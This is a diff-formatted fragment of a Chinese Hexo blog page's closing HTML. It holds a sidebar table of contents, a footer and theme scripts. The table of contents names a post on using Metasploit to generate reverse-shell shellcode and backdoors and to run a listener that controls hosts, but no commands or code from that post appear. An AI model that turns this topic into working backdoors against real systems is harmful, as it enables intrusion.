+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#采用metasploit框架生成反弹shellcode"><span class="nav-number">1.</span> <span class="nav-text">采用metasploit框架生成反弹shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-metasploit框架安装"><span class="nav-number">1.1.</span> <span class="nav-text">1. metasploit框架安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-MSF-生成各种后门"><span class="nav-number">1.2.</span> <span class="nav-text">2. MSF 生成各种后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF-生成ShellCode"><span class="nav-number">1.3.</span> <span class="nav-text">MSF 生成ShellCode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MFS控制主机-启动侦听程序"><span class="nav-number">1.4.</span> <span class="nav-text">MFS控制主机,启动侦听程序</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">司图</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">67.2k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
